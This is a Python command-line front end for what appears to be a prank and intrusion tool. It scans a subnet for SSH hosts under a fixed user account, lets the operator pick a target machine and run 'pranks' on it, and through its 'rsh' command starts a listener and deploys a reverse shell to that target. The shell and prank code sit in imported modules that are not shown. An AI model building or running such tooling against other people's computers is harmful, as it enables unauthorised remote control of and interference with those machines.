#!/usr/bin/env python3

import threading
from reverse_shell import RSHConnection
from jokes import Jokes
from scanner import SSHScanner

joke = Jokes("spravce")

scanner = SSHScanner(user="spravce", ssh_timeout=5)

scanner_config: dict[str, str] = {}


def scan():
    while True:
        sub_cmd: str = input("scan> ")

        match sub_cmd:
            case s if "setup" in s:
                network_ip = scanner._network_ip_validation()
                mask = scanner._network_mask_validation()
                scanner_config["network_ip"] = network_ip
                scanner_config["mask"] = mask
                print(f"Config saved: {network_ip}/{mask}")

            case s if "load" in s:
                scanner.run(force_scan=False)

            case s if "run" in s:
                network_ip = scanner_config.get("network_ip")
                mask = scanner_config.get("mask")
                if network_ip and mask:
                    scanner.run(force_scan=True, network_ip=network_ip, mask=mask)
                else:
                    print("No config found. Use 'setup' first.")

            case s if "exit" in s:
                return

            case _:
                print("Usage: scan [setup|load|run]")

def main():
    user_cmd: str = input("> ")

    match user_cmd:
        case cmd if "scan" in cmd:
            scan()

        case cmd if "list" in cmd:
            joke.print_pranks()

        case cmd if "prank" in cmd:
            joke.print_pranks()
            joke.get_prank()

        case cmd if "target" in cmd:
            scanner.print_hosts()
            joke.get_target_pc()

        case cmd if "run" in cmd:
            joke.run()

        case cmd if "rsh" in cmd:
            if not joke.target_pc:
                print("No target selected. Use 'target' first.")
                return
            my_ip: str = input("Your ip: ")
            rsh_connection = RSHConnection(my_ip)
            listener_thread = threading.Thread(
                target=rsh_connection.listen, daemon=True
            )
            listener_thread.start()
            print(f"Listener started, deploying to {joke.target_pc}...")
            rsh_connection.deploy(joke.target_pc)

        case _:
            print("Help: [scan|list|prank|target|run|rsh]")
            return


if __name__ == "__main__":
    while True:
        main()
